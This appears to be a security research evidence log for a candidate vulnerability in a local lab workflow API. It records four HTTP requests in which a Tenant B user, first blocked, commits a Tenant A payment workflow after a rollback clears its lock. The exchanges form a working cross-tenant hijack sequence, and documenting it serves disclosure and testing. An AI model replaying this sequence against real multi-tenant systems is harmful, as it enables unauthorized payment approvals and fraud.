# Empirical Evidence Log: CAND-001

## Recorded Network & State Telemetry

### 1. Workflow Initiation (Victim Tenant A)
```http
POST /api/workflow/initiate HTTP/1.1
Host: 127.0.0.1:8888
Authorization: Bearer <JWT_ALICE_ADMIN_TENANT_A>
Content-Type: application/json

{"payload": {"contract_id": 9942, "amount": 500000, "action": "APPROVE_PAYMENT"}}

HTTP/1.1 201 Created
Content-Type: application/json
X-Research-Lab-Mode: vulnerable

{"workflow_id": "wf-1771687000-4b1f", "stage": 1, "status": "INITIATED", "tenant_id": "tenant_a"}
```

### 2. Direct Cross-Tenant Access Attempt (Negative Control Initial)
```http
POST /api/workflow/commit HTTP/1.1
Host: 127.0.0.1:8888
Authorization: Bearer <JWT_BOB_USER_TENANT_B>
Content-Type: application/json

{"workflow_id": "wf-1771687000-4b1f"}

HTTP/1.1 403 Forbidden
{"error": "Forbidden: Tenant mismatch"}
```

### 3. Asynchronous Rollback Triggered (Tenant A)
```http
POST /api/workflow/stage HTTP/1.1
Host: 127.0.0.1:8888
Authorization: Bearer <JWT_ALICE_ADMIN_TENANT_A>
Content-Type: application/json

{"workflow_id": "wf-1771687000-4b1f", "action": "rollback"}

HTTP/1.1 200 OK
{"workflow_id": "wf-1771687000-4b1f", "status": "STAGED_AWAITING_RETRY", "lock": null}
```

### 4. Cross-Tenant Hijack Commit (Tenant B Attacker)
```http
POST /api/workflow/commit HTTP/1.1
Host: 127.0.0.1:8888
Authorization: Bearer <JWT_BOB_USER_TENANT_B>
Content-Type: application/json

{"workflow_id": "wf-1771687000-4b1f"}

HTTP/1.1 200 OK
{"message": "WORKFLOW_APPROVED_UNDER_TENANT_AUTHORITY", "workflow_id": "wf-1771687000-4b1f", "original_tenant": "tenant_a", "executing_actor": "bob_user", "status": "APPROVED_AND_EXECUTED"}
```
